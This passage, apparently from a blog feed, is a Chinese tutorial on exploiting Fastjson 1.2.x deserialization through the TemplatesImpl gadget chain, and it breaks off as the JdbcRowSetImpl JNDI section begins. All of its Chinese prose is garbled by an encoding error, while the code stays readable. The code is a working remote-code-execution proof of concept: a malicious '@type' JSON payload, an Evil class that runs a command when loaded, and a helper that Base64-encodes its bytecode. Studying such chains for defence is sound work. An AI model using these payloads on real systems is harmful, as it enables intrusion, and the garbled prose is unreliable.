href="https://z3r4y.blog.csdn.net/article/details/136889141">ã€Webã€‘æµ…èŠJacksonåºåˆ—åŒ–getterçš„åˆ©ç”¨â€”â€”POJONode-CSDNåšå®¢</a></p><p>è¿™é‡ŒZ3r4yå¸ˆå‚…ä»‹ç»äº†Jacksonçš„getteråˆ©ç”¨Templateå’ŒSignedObjectäºŒæ¬¡ååºåˆ—åŒ–çš„å†…å®¹ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">Jacksonçš„åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨ | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson</title>
    <link href="/2024/08/01/fastjson/"/>
    <url>/2024/08/01/fastjson/</url>
    
    <content type="html"><![CDATA[<p>åˆ°äº†å–œé—»ä¹è§çš„Fastjsonã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚é¡¾åæ€ä¹‰ï¼ŒFastJsonçš„ç‰¹ç‚¹å°±æ˜¯å¿«ã€‚</p><p>å…ˆä»æœ€ç®€å•çš„ç”¨æ³•è¯´èµ·å§ã€‚</p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>ä¾èµ–ç”¨çš„1.2.23</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="POJO-JSON"><a href="#POJO-JSON" class="headerlink" title="POJO &#x3D;&gt; JSON"></a>POJO &#x3D;&gt; JSON</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.toJSONString()<br></code></pre></td></tr></table></figure><p>å‚æ•°è®¾ç½®ï¼š</p><ul><li><p>SerializerFeature.WriteClassName</p><p>åºåˆ—åŒ–æ—¶ï¼Œä¼šå¤šå‡ºä¸€ä¸ª<code>@type</code>è·Ÿä¸Šç±»å</p></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; and &quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> JSON.toJSONString((person1));<br>        System.out.println(str1);<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Lisa&quot;</span>, <span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(person2, SerializerFeature.WriteClassName);<br>        System.out.println(str2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>getAge</p><p>getName</p><p>{â€œageâ€:18,â€nameâ€:â€Tomâ€}</p><p>getAge</p><p>getName</p><p>{â€œ@typeâ€:â€org.example.Personâ€,â€ageâ€:20,â€nameâ€:â€Lisaâ€}</p></blockquote><h3 id="JSON-POJO"><a href="#JSON-POJO" class="headerlink" title="JSON &#x3D;&gt; POJO"></a>JSON &#x3D;&gt; POJO</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject()<br></code></pre></td></tr></table></figure><p>å‚æ•°è®¾ç½®ï¼š</p><ul><li>Feature.SupportNonPublicField ååºåˆ—åŒ–æ—¶ï¼ŒåŠ ä¸Šè¯¥å‚æ•°æ‰èƒ½è¿˜åŸprivateå±æ€§</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>, Person.class, Feature.SupportNonPublicField);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p></blockquote><h3 id="parse-vs-parseObject"><a href="#parse-vs-parseObject" class="headerlink" title="parse vs parseObject"></a>parse vs parseObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(s);<br>        System.out.println(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(s);<br>        System.out.println(obj2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>getAge</p><p>getName</p><p>{â€œnameâ€:â€Lisaâ€,â€ageâ€:20}</p></blockquote><p>å¯ä»¥çœ‹åˆ°<code>JSON.parseObject()</code>çš„æ‰“å°ç»“æœå’Œæˆ‘ä»¬å®šä¹‰çš„<code>toString()</code>ä¸åŒï¼Œè¯´æ˜å®ƒä¸æ˜¯Personå¯¹è±¡ã€‚ï¼ˆå®é™…ä¸Šå¾—åˆ°çš„æ˜¯JSONObjectç±»å¯¹è±¡ï¼‰</p><p>ç»“è®ºï¼š</p><ul><li>parse()ä¼š<strong>è¯†åˆ«</strong>å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„setteræ–¹æ³•</li><li>parseObject()ä¼šè§¦å‘ç›®æ ‡ç±»çš„getterå’Œsetteræ–¹æ³•</li></ul><p><strong>å› æ­¤è‹¥èƒ½æ‰¾åˆ°ä¸€ä¸ªç±»ã€åœ¨ååºåˆ—åŒ–è¿™ä¸ªç±»å¯¹è±¡æ—¶ï¼Œfastjsonè°ƒç”¨å…¶setteræˆ–getteræ–¹æ³•ï¼Œä¸”setteræˆ–getteræ–¹æ³•å­˜åœ¨æ¼æ´ï¼Œå°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</strong></p><p>ä¸‹é¢å†åˆ—ä¸¾ä¸€äº›FastJsonçš„ç»“è®ºï¼Œåœ¨åç»­è°ƒè¯•ä¸­å¯ä»¥è§‚å¯Ÿå¾—åˆ°ï¼š</p><ul><li><code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</li><li><code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸ setter éƒ½è¢«è°ƒç”¨ã€‚</li><li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</li><li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</li><li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get&#x2F;set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_ | -</code> å­—ç¬¦ä¸²ï¼Œå‡å¦‚å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ã€‚</li></ul><p>é…ç½®ç±»ï¼š</p><p><code>com.alibaba.fastjson.parser.ParserConfig</code>ï¼šåé¢çš„AutoTypeå¼€å…³å’Œé»‘åå•ä½“ç°åœ¨è¿™ä¸ªç±»ä¸­</p><p>æ»¡è¶³æ¡ä»¶çš„setterï¼š</p><ul><li>å‡½æ•°åå¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>ä»¥setå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>æ»¡è¶³æ¡ä»¶çš„getter</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicInteger</li></ul><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>åœ¨å‰é¢çš„åŠ¨æ€å­—èŠ‚ç é‚£é‡Œæåˆ°è¿‡ï¼š</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»<br>    TransletClassLoader<br></code></pre></td></tr></table></figure><p>å­˜åœ¨ä½œç”¨åŸŸä¸º<code>default</code>çš„æ–¹æ³•<code>defineClass</code></p><p>æ‰¾åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><p>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplatesImpl#getOutputProperties()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#newTransformer()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span>&#123;<br>    TransformerImpl transformer;<br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>                                      _indentNumber, _tfactory);<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#getTransletInstance()</span><br><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>    <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>        <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-comment">// TemplatesImpl#defineTransletClasses()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span><br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;TransletClassLoader&gt;() &#123;<br>            <span class="hljs-keyword">public</span> TransletClassLoader <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),<br>                                               _tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>        _class[i] = loader.defineClass(_bytecodes[i], pd);<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>defineTransletClasses</code>æ–¹æ³•ä¸­<code>_tfactory.getExternalExtensionsMap()</code> <code>_tfactory</code>æ˜¯<code>TransformerFactoryImpl</code>ç±» ä¸ºäº†ä¸æŠ›å‡ºå¼‚å¸¸éœ€è¦<code>_tfactory = new TransformerFactoryImpl()</code></li><li><code>getTransletInstance</code>æ–¹æ³•ä¸­åˆ¤æ–­<code>if (_name == null) return null;</code> æ‰€ä»¥è¦ç»™<code>_name</code>èµ‹å€¼ï¼ˆStringï¼‰</li></ul><p><code>TemplatesImpl</code> ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼š</p><p>è¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯**<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>çš„å­ç±»ã€‚**</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getTransletInstance()é¦–å…ˆæ‰§è¡Œ defineTransletClasses()åŠ è½½ç±»åï¼Œè¿˜ä¼šå¯¹è¯¥ç±»è¿›è¡Œå®ä¾‹åŒ– (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure><p>è€Œ<code>getOutputProperties()</code>æ­£æ˜¯<code>TemplatesImpl</code>çš„<code>_outputProperties</code>å±æ€§å¯¹åº”çš„getteræ–¹æ³•ã€‚</p><p>ç”±äºæ›´æ”¹çš„ä¸€äº›<code>TemplatesImpl</code>ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</p><h4 id="PayLoad"><a href="#PayLoad" class="headerlink" title="PayLoad"></a>PayLoad</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;evilCode after Base64&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;taco&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_tfactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Evil.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·å–Base64ç¼–ç åçš„Evil.classå­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å±€é™"><a href="#å±€é™" class="headerlink" title="å±€é™"></a>å±€é™</h4><p>éœ€è¦ <code>Feature.SupportNonPublicField</code> å‚æ•°</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>ä¸Šæ–‡çš„<code>TemplatesImpl</code>é“¾å­˜åœ¨ä¸¥é‡é™åˆ¶ï¼Œå³<code>JSON.parse()</code>éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code></p><p><code>JdbcRowSetImpl</code>é“¾æ˜¯åŸºäº JNDI+RMI æˆ– JDNI+LADP è¿›è¡Œæ”»å‡»ï¼Œä¼šæœ‰ä¸€å®šçš„JDKç‰ˆæœ¬é™åˆ¶ã€‚</p><blockquote><p>RMIåˆ©ç”¨çš„JDKç‰ˆæœ¬â‰¤ JDK 6u132ã€7u122ã€8u113</p><p>LADPåˆ©ç”¨JDKç‰ˆæœ¬â‰¤ 6u211 ã€7u201ã€8u191</p></blockquote><p><code>com.sun.rowset.JdbcRowSetImpl</code></p><figure class="highlight 